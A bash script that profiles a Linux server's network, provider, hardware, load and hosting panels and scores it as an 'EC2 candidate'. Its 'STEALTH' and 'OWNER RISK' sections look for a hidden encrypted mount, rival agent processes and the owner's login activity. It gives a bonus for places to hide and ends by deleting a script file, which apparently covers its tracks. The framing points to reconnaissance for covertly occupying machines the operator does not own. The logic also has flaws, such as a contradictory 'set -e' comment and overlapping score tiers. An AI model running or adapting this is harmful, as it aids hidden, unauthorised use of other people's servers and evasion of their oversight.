#!/bin/bash
# vps_assess.sh v2 — Evaluate VPS for EC2 candidacy
# Improved: BT Panel detection, provider/location detection, timeout fix

set -e  # Don't exit on error
STUCK_TIMEOUT=5

echo "=== NETWORK ==="
echo -n "Public IP: "
PUBLIC_IP=$(curl -s --connect-timeout $STUCK_TIMEOUT --max-time $STUCK_TIMEOUT ifconfig.me 2>/dev/null || echo "TIMEOUT/UNREACHABLE")
echo "$PUBLIC_IP"

echo -n "Local IP: "
ip -4 addr show | grep -oP 'inet \K[\d.]+' | grep -v 127.0.0.1 | head -1 || echo "Unknown"

echo -n "Default gateway: "
ip route | grep default | awk '{print $3}' | head -1 || echo "None"

echo -n "DNS upstream: "
cat /etc/resolv.conf 2>/dev/null | grep nameserver | awk '{print $2}' | tr '\n' ' '
echo

echo -n "Provider: "
case "$PUBLIC_IP" in
  84.247.*|84.*) echo "Contabo (Europe)" ;;
  165.22.*|165.*) echo "DigitalOcean" ;;
  64.90.*) echo "NetLab / HK" ;;
  14.*) echo "China Telecom/Unicom" ;;
  120.*) echo "China (likely China Unicom)" ;;
  18.*|3.*|35.*|44.*|52.*|54.*) echo "AWS" ;;
  34.*|35.*) echo "Google Cloud" ;;
  13.*|20.*|40.*|104.*) echo "Microsoft Azure" ;;
  45.*|185.*) echo "Possibly Hetzner / European" ;;
  TIMEOUT*) echo "Unknown (network unreachable)" ;;
  *) echo "Unknown (check ASN manually)" ;;
esac

echo -n "Location: "
if [ "$PUBLIC_IP" != "TIMEOUT/UNREACHABLE" ]; then
  LOCATION=$(curl -s --connect-timeout 3 --max-time 3 "http://ip-api.com/line/$PUBLIC_IP?fields=country,regionName,city,isp,org" 2>/dev/null || echo "Lookup failed")
  echo "$LOCATION"
else
  echo "Unknown (no public IP)"
fi

echo -n "Accessible TCP ports: "
ss -tlnp 2>/dev/null | awk 'NR>1 {print $4}' | grep -oP ':\K\d+' | sort -un | tr '\n' ' '
echo

echo "=== SPEC ==="
echo "CPU cores: $(nproc)"
echo "CPU model: $(grep 'model name' /proc/cpuinfo | head -1 | cut -d: -f2)"
echo "Hypervisor: $(grep -i 'hypervisor\|manufacturer' /sys/class/dmi/id/product_name 2>/dev/null || grep -i 'hypervisor' /proc/cpuinfo 2>/dev/null | head -1 || echo 'Unknown')"
echo "RAM total: $(free -h | awk '/^Mem:/ {print $2}')"
echo "RAM available: $(free -h | awk '/^Mem:/ {print $7}')"
echo "Disk total: $(df -h / | awk 'NR==2 {print $2}')"
echo "Disk free: $(df -h / | awk 'NR==2 {print $4}')"
echo "Disk used %: $(df -h / | awk 'NR==2 {print $5}')"

echo "=== LOAD ==="
echo "Uptime: $(uptime -p 2>/dev/null || uptime | awk -F'up ' '{print $2}' | awk -F',' '{print $1}')"
echo "Load avg: $(awk '{print $1,$2,$3}' /proc/loadavg)"
echo "Process count: $(ps aux | wc -l)"
echo "Docker: $(docker ps -q 2>/dev/null | wc -l || echo 'Not installed')"

echo "=== PANEL DETECTION ==="
BT_PANEL=0
# BT Panel / aaPanel
if [ -d "/www/server/panel" ]; then
  echo "BT Panel / aaPanel: DETECTED (/www/server/panel exists)"
  BT_PANEL=1
elif ss -tlnp | grep -qE ":8888|:8887"; then
  echo "BT Panel / aaPanel: DETECTED (port 8888/8887)"
  BT_PANEL=1
elif command -v bt &>/dev/null; then
  echo "BT Panel / aaPanel: DETECTED (bt command)"
  BT_PANEL=1
else
  echo "BT Panel / aaPanel: Not found"
fi

# Other panels
[ -d "/usr/local/cpanel" ] && echo "cPanel: DETECTED"
[ -d "/usr/local/vesta" ] || [ -d "/usr/local/vestacp" ] && echo "VestaCP: DETECTED"
[ -d "/usr/local/cyberpanel" ] && echo "CyberPanel: DETECTED"
command -v plesk 2>/dev/null && echo "Plesk: DETECTED"

echo "=== STEALTH ==="
echo "Exposed services: $(ss -tlnp | wc -l)"
echo "Encrypted mount: $(mountpoint -q /var/lib/.local/.state 2>/dev/null && echo YES || echo NO)"
echo "WireGuard: $(wg show 2>/dev/null || echo 'Not found')"
echo "Suspicious (copaw/qwenpaw): $(ps aux | grep -E 'nodeget|copaw|qwenpaw' | grep -v grep | wc -l)"

echo "=== OWNER RISK ==="
echo "User count: $(cat /etc/passwd | wc -l)"
echo "Login users: $(w | wc -l | awk '{print $1}')"
echo "Recent logins:"
last -5 2>/dev/null || echo "  No login history"

echo "=== EC2 SCORE ==="
SCORE=0

# Network
[ "$PUBLIC_IP" != "TIMEOUT/UNREACHABLE" ] && SCORE=$((SCORE+15)) || SCORE=$((SCORE-10))

# CPU
[ "$(nproc)" -ge 8 ] && SCORE=$((SCORE+20))
[ "$(nproc)" -ge 4 ] && SCORE=$((SCORE+10))

# RAM
RAM_AVAIL=$(free -m | awk '/^Mem:/ {print $7}')
[ "$RAM_AVAIL" -gt 8000 ] && SCORE=$((SCORE+20))
[ "$RAM_AVAIL" -gt 4000 ] && SCORE=$((SCORE+10))

# Disk
DISK_FREE=$(df / | awk 'NR==2 {print $4}')
[ "$DISK_FREE" -gt 100000000 ] && SCORE=$((SCORE+15))
[ "$DISK_FREE" -gt 50000000 ] && SCORE=$((SCORE+10))

# BT Panel = stealth bonus (can hide)
[ "$BT_PANEL" -eq 1 ] && SCORE=$((SCORE+15))

# Encrypted mount
mountpoint -q /var/lib/.local/.state 2>/dev/null && SCORE=$((SCORE+10))

# Low load
LOAD=$(awk '{print $1}' /proc/loadavg)
[ "$(echo "$LOAD < 1" | bc 2>/dev/null || echo 0)" -eq 1 ] && SCORE=$((SCORE+10))

# Docker available
docker ps &>/dev/null && SCORE=$((SCORE+5))

echo "Final score: $SCORE / 100"
if [ "$SCORE" -ge 70 ]; then
  echo "Recommendation: ✅ EC2_CANDIDATE (strong)"
elif [ "$SCORE" -ge 50 ]; then
  echo "Recommendation: ⚠️ POSSIBLE (needs review)"
else
  echo "Recommendation: ❌ NOT_RECOMMENDED"
fi

rm asset.sh
